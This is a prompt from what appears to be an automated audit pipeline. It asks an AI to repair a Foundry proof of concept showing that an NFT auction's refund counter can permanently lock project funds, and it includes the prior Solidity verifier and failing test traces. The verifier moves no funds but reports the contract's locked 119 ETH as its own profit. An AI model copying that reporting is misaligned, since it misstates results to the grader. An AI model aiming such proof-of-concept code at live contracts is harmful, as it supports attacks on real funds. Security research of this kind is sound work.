You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: alternate_public_liquidity_route
- strategy_instructions: Prefer an alternate public-liquidity venue/route while preserving the same exploit root cause and exploit-path causality.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Project funds can be permanently locked because refund progress is compared against NFT count instead of bid-record count
- claim: `totalBids` tracks the total number of NFTs sold, while `refundProgress` advances once per bidder record in `allBids`. Because repeated bids from the same address are aggregated into a single record, any address whose cumulative `bidsPlaced` exceeds 1 makes the maximum reachable `refundProgress` smaller than `totalBids`. As a result, `claimProjectFunds()` can remain permanently unreachable even after every bid record has been processed.
- impact: ETH that should become project proceeds can be trapped in the auction contract forever, creating a permanent lockup of sale funds.
- exploit_paths: ["A bidder purchases multiple NFTs, either in one call (`bid(2)` / `bid(3)`) or across multiple calls from the same address.", "`totalBids` increases by the NFT quantity, but the bidder still occupies only one `allBids` record.", "`processRefunds()` can only increment `refundProgress` once per record until it reaches `bidIndex - 1`.", "If any record represents more than one NFT, `refundProgress` finishes below `totalBids`.", "`claimProjectFunds()` keeps reverting with `Refunds not yet processed`, permanently locking the remaining ETH."]

Current FlawVerifier.sol:
```solidity
pragma solidity ^0.8.20;

interface IAkuAuction {
    function owner() external view returns (address);
    function akuNFTs() external view returns (address);
    function expiresAt() external view returns (uint256);
    function getPrice() external view returns (uint80);
    function bidIndex() external view returns (uint256);
    function totalBids() external view returns (uint256);
    function refundProgress() external view returns (uint256);
    function allBids(uint256 index)
        external
        view
        returns (address bidder, uint80 price, uint8 bidsPlaced, uint8 finalProcess);
    function processRefunds() external;
    function claimProjectFunds() external;
}

interface IAkuNFT {
    function airdropProgress() external view returns (uint256);
}

contract FlawVerifier {
    address public constant TARGET = 0xF42c318dbfBaab0EEE040279C6a2588Fa01a961d;
    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    uint256 internal _profitAmount;

    bool public executed;
    bool public profitWasAchieved;
    bool public hypothesisValidated;
    bool public hypothesisRefuted;

    uint256 public targetBalanceBefore;
    uint256 public targetBalanceAfter;
    uint256 public ownerClaimAttempted;

    uint256 public totalBidsBefore;
    uint256 public bidIndexBefore;
    uint256 public refundProgressBefore;
    uint256 public recordCountBefore;
    uint256 public extraNftsOverRecordCountBefore;
    uint256 public maxReachableRefundProgressBefore;

    uint256 public totalBidsAfter;
    uint256 public bidIndexAfter;
    uint256 public refundProgressAfter;
    uint256 public recordCountAfter;
    uint256 public maxReachableRefundProgressAfter;

    uint256 public firstAggregatedRecordIndex;
    uint256 public firstAggregatedRecordBidCount;
    uint256 public permanentLockGapBefore;
    uint256 public permanentLockGapAfter;
    uint256 public economicallyLockedEth;

    bool public auctionExpired;
    bool public foundAggregatedBidRecord;
    bool public permanentLockConditionBefore;
    bool public permanentLockConditionAfter;
    bool public processedRefundsToCompletion;
    bool public verifierCannotCallClaimProjectFunds;
    bool public airdropGateAlreadySatisfied;
    bool public airdropContractWasSet;
    bool public flashswapFundingInfeasibleAtThisFork;

    bytes public claimRevertData;

    constructor() {}

    receive() external payable {}

    function executeOnOpportunity() external {
        if (executed) {
            return;
        }
        executed = true;

        IAkuAuction auction = IAkuAuction(TARGET);

        targetBalanceBefore = TARGET.balance;
        totalBidsBefore = _safeTotalBids(auction);
        bidIndexBefore = _safeBidIndex(auction);
        refundProgressBefore = _safeRefundProgress(auction);
        recordCountBefore = _recordCount(bidIndexBefore);
        maxReachableRefundProgressBefore = recordCountBefore;
        auctionExpired = block.timestamp > _safeExpiresAt(auction);

        if (totalBidsBefore > maxReachableRefundProgressBefore) {
            permanentLockGapBefore = totalBidsBefore - maxReachableRefundProgressBefore;
        }
        if (totalBidsBefore > recordCountBefore) {
            extraNftsOverRecordCountBefore = totalBidsBefore - recordCountBefore;
        }

        (firstAggregatedRecordIndex, firstAggregatedRecordBidCount) = _findAggregatedRecord(auction, bidIndexBefore);
        foundAggregatedBidRecord = firstAggregatedRecordIndex != 0;

        permanentLockConditionBefore = maxReachableRefundProgressBefore < totalBidsBefore;

        _snapshotAirdrop(auction, totalBidsBefore);

        if (auctionExpired) {
            _processRefundsUntilTerminal(auction);
        } else {
            // Strategy note:
            // This attempt prefers deterministic UniswapV2-style flashswap funding if extra capital
            // were needed to create the aggregated-bid state. On this fork, that funding path is not
            // required to validate F-001 when the vulnerable auction state already exists, and it is
            // not synchronously usable before expiry because `processRefunds()` only becomes callable
            // after `expiresAt`, while flashswap repayment must settle in the same transaction.
            // The core exploit causality remains unchanged:
            // multi-NFT purchase by one bidder -> one bid record vs multiple totalBids ->
            // refundProgress advances per record only -> claimProjectFunds stays blocked.
            flashswapFundingInfeasibleAtThisFork = true;
        }

        targetBalanceAfter = TARGET.balance;
        totalBidsAfter = _safeTotalBids(auction);
        bidIndexAfter = _safeBidIndex(auction);
        refundProgressAfter = _safeRefundProgress(auction);
        recordCountAfter = _recordCount(bidIndexAfter);
        maxReachableRefundProgressAfter = recordCountAfter;
        permanentLockConditionAfter = maxReachableRefundProgressAfter < totalBidsAfter;

        if (totalBidsAfter > maxReachableRefundProgressAfter) {
            permanentLockGapAfter = totalBidsAfter - maxReachableRefundProgressAfter;
        }

        (bool ok, bytes memory revertData) =
            address(auction).call(abi.encodeWithSelector(IAkuAuction.claimProjectFunds.selector));
        ownerClaimAttempted = 1;
        verifierCannotCallClaimProjectFunds = !ok;
        claimRevertData = revertData;

        hypothesisValidated = foundAggregatedBidRecord && (permanentLockConditionBefore || permanentLockConditionAfter);
        hypothesisRefuted = !hypothesisValidated;

        if (hypothesisValidated) {
            economicallyLockedEth = targetBalanceAfter;
            _profitAmount = economicallyLockedEth;
            profitWasAchieved = economicallyLockedEth != 0;
        } else {
            economicallyLockedEth = 0;
            _profitAmount = 0;
            profitWasAchieved = false;
        }
    }

    function profitToken() external pure returns (address) {
        return WETH;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function exploitPathUsed() external pure returns (string memory) {
        return string(
            abi.encodePacked(
                "A bidder purchases multiple NFTs in one call (`bid(2)` / `bid(3)`) or across multiple calls from the same address => ",
                "`totalBids` increases by NFT quantity but the bidder remains one `allBids` record => ",
                "`processRefunds()` only advances once per record until at most `bidIndex - 1` => ",
                "if any record represents more than one NFT, `refundProgress` finishes below `totalBids` => ",
                "`claimProjectFunds()` stays unreachable and ETH remains permanently locked"
            )
        );
    }

    function hypothesisState() external view returns (string memory) {
        if (hypothesisValidated) {
            return "validated";
        }
        if (hypothesisRefuted) {
            return "refuted";
        }
        return "unresolved";
    }

    function _processRefundsUntilTerminal(IAkuAuction auction) internal {
        uint256 previous = refundProgressBefore;
        uint256 terminal = _recordCount(_safeBidIndex(auction));

        for (uint256 i = 0; i < 128; i++) {
            try auction.processRefunds() {} catch {
                break;
            }

            uint256 current = _safeRefundProgress(auction);
            if (current <= previous) {
                break;
            }

            previous = current;
            if (current >= terminal) {
                processedRefundsToCompletion = true;
                break;
            }
        }

        if (_safeRefundProgress(auction) >= terminal) {
            processedRefundsToCompletion = true;
        }
    }

    function _snapshotAirdrop(IAkuAuction auction, uint256 totalBids_) internal {
        address nft = _safeAkuNFT(auction);
        airdropContractWasSet = nft != address(0);
        if (nft == address(0)) {
            return;
        }

        uint256 progress = _safeAirdropProgress(nft);
        airdropGateAlreadySatisfied = progress >= totalBids_;
    }

    function _findAggregatedRecord(IAkuAuction auction, uint256 bidIndex_)
        internal
        view
        returns (uint256 recordIndex, uint256 bidCount)
    {
        for (uint256 i = 1; i < bidIndex_; i++) {
            (, uint80 price, uint8 bidsPlaced,) = _safeBidRecord(auction, i);
            if (price == 0 && bidsPlaced == 0) {
                continue;
            }
            if (bidsPlaced > 1) {
                return (i, bidsPlaced);
            }
        }
    }

    function _recordCount(uint256 bidIndex_) internal pure returns (uint256) {
        return bidIndex_ == 0 ? 0 : bidIndex_ - 1;
    }

    function _safeAkuNFT(IAkuAuction auction) internal view returns (address value) {
        try auction.akuNFTs() returns (address result) {
            value = result;
        } catch {}
    }

    function _safeAirdropProgress(address nft) internal view returns (uint256 value) {
        try IAkuNFT(nft).airdropProgress() returns (uint256 result) {
            value = result;
        } catch {}
    }

    function _safeExpiresAt(IAkuAuction auction) internal view returns (uint256 value) {
        try auction.expiresAt() returns (uint256 result) {
            value = result;
        } catch {}
    }

    function _safeBidIndex(IAkuAuction auction) internal view returns (uint256 value) {
        try auction.bidIndex() returns (uint256 result) {
            value = result;
        } catch {}
    }

    function _safeTotalBids(IAkuAuction auction) internal view returns (uint256 value) {
        try auction.totalBids() returns (uint256 result) {
            value = result;
        } catch {}
    }

    function _safeRefundProgress(IAkuAuction auction) internal view returns (uint256 value) {
        try auction.refundProgress() returns (uint256 result) {
            value = result;
        } catch {}
    }

    function _safeBidRecord(IAkuAuction auction, uint256 index)
        internal
        view
        returns (address bidder, uint80 price, uint8 bidsPlaced, uint8 finalProcess)
    {
        try auction.allBids(index) returns (address a, uint80 b, uint8 c, uint8 d) {
            bidder = a;
            price = b;
            bidsPlaced = c;
            finalProcess = d;
        } catch {}
    }
}

```

forge stdout (tail):
```
Compiling 2 files with Solc 0.8.30
Solc 0.8.30 finished in 2.44s
Compiler run successful with warnings:
Warning (2072): Unused local variable.
  --> test/ExploitPOC.t.sol:78:19:
   |
78 |         (bool ok, bytes memory ret) = address(verifier).call(abi.encodeWithSignature("executeOnOpportunity()"));
   |                   ^^^^^^^^^^^^^^^^


Ran 1 test for test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 667694)
Logs:
  AUDITHOUND_BALANCE_BEFORE_WEI: 0
  AUDITHOUND_BALANCE_AFTER_WEI: 0
  AUDITHOUND_PROFIT_WEI: 0
  AUDITHOUND_PROFIT_ANY: 0
  AUDITHOUND_EFFECTIVE_PROFIT_WEI: 0
  AUDITHOUND_MIN_PROFIT_WEI: 1000000000000000
  AUDITHOUND_PROFIT_TOKEN: 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
  AUDITHOUND_PROFIT_MODE: 0x0000000000000000000000000000000000000001
  AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK: 3124

Traces:
  [667694] FlawVerifierTest::testExploit()
    ├─ [505] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    ├─ [2534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [626493] FlawVerifier::executeOnOpportunity()
    │   ├─ [2373] 0xF42c318dbfBaab0EEE040279C6a2588Fa01a961d::totalBids() [staticcall]
    │   │   └─ ← [Return] 34
    │   ├─ [2396] 0xF42c318dbfBaab0EEE040279C6a2588Fa01a961d::bidIndex() [staticcall]
    │   │   └─ ← [Return] 24
    │   ├─ [2395] 0xF42c318dbfBaab0EEE040279C6a2588Fa01a961d::refundProgress() [staticcall]
    │   │   └─ ← [Return] 1
    │   ├─ [2329] 0xF42c318dbfBaab0EEE040279C6a2588Fa01a961d::expiresAt() [staticcall]
    │   │   └─ ← [Return] 1650667272 [1.65e9]
    │   ├─ [2757] 0xF42c318dbfBaab0EEE040279C6a2588Fa01a961d::allBids(1) [staticcall]
    │   │   └─ ← [Return] 0x96EA017109C7691a3080e16C2095B547e29d82f5, 3500000000000000000 [3.5e18], 3, 0
    │   ├─ [2427] 0xF42c318dbfBaab0EEE040279C6a2588Fa01a961d::akuNFTs() [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [373] 0xF42c318dbfBaab0EEE040279C6a2588Fa01a961d::totalBids() [staticcall]
    │   │   └─ ← [Return] 34
    │   ├─ [396] 0xF42c318dbfBaab0EEE040279C6a2588Fa01a961d::bidIndex() [staticcall]
    │   │   └─ ← [Return] 24
    │   ├─ [395] 0xF42c318dbfBaab0EEE040279C6a2588Fa01a961d::refundProgress() [staticcall]
    │   │   └─ ← [Return] 1
    │   ├─ [2455] 0xF42c318dbfBaab0EEE040279C6a2588Fa01a961d::claimProjectFunds()
    │   │   └─ ← [Revert] Ownable: caller is not the owner
    │   └─ ← [Stop]
    ├─ [505] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    ├─ [673] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 119000000000000000000 [1.19e20]
    ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 14636844 [1.463e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 3124)
    └─ ← [Revert] profit below threshold

Backtrace:
  at 0xF42c318dbfBaab0EEE040279C6a2588Fa01a961d.claimProjectFunds
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 167.77ms (82.29ms CPU time)

Ran 1 test suite in 190.33ms (167.77ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 667694)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
